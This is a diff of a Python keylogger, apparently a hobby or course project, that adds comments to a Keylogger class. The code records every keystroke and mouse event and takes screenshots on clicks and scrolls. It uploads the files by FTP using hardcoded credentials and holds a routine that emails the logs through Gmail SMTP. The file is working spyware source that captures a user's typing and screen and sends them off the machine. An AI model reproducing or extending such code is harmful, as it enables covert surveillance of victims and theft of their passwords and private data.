@@ -8,7 +8,6 @@ from ftplib import FTP
 from PIL import ImageGrab
 import os
 context = ssl.create_default_context()
-#logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
  
 class Keylogger:
     def __init__(self,timeinterval,email,password):
@@ -28,23 +27,27 @@ class Keylogger:
         self.fileuname = "testuser"
         self.filepassword = "hello"
     
+    #callback for mouse listener
     def on_move(self,x,y):
         current = self.logger.info("Mouse moved to ({0}, {1})".format(x, y))
         #self.log=self.log+current
         if self.stopmouse:
             return False
     
+    #callback for mouse listener
     def on_click(self,x,y,button,pressed):
         if pressed:
             self.getScreenshot()
             current = self.logger.info('Mouse clicked at ({0}, {1}) with {2}'.format(x, y, button))
             #self.log+=self.log+current
-
+    
+    #callback for mouse listener
     def on_scroll(self,x,y,dx,dy):
         self.getScreenshot()
         current = self.logger.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))
         #self.log = self.log+current
 
+    #callback for keyboard listener
     def on_press(self,key):
         current = self.logger.info("Key pressed {}".format(str(key)))
         #self.log = self.log+current
@@ -53,6 +56,7 @@ class Keylogger:
             self.stopmouse=True
             return False
 
+    #Method to get a screenshot and send to the FTP server
     def getScreenshot(self):
         im = ImageGrab.grab()
         imagefile ="Image_{}.jpg".format(datetime.now().strftime("%H_%M_%S")) 
@@ -60,7 +64,7 @@ class Keylogger:
         self.send_ftp(imagefile)
         os.remove(imagefile)
 
-
+    #Method to send the log messages via email
     def send_mail(self,email,password,message):
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls(context=context)
@@ -68,6 +72,7 @@ class Keylogger:
         server.sendmail(email, email, message)
         server.quit()
 
+    #Method to send the files
     def send_ftp(self,filename):
         ftp = FTP('localhost')
         ftp.login(self.fileuname,self.filepassword)
@@ -75,16 +80,19 @@ class Keylogger:
             ftp.storbinary("STOR "+filename,file)
         ftp.quit()
         
+    #Method to create a new handler
     def generateNewHandler(self,filename):
         self.fh = logging.FileHandler(filename,"w")
         self.fh.setFormatter(self.formatter)
         self.fh.setLevel(logging.DEBUG)
         self.logger.addHandler(self.fh)
 
+    #Method to delete an old handler
     def deleteOldHandler(self):
         self.fh.close()
         self.logger.removeHandler(self.fh)
 
+    #A timer interrupt called every timeinterval
     def report(self):
         #self.send_mail(self.email,self.password,'\n\n'+self.log)
         self.send_ftp(self.currentfilename)
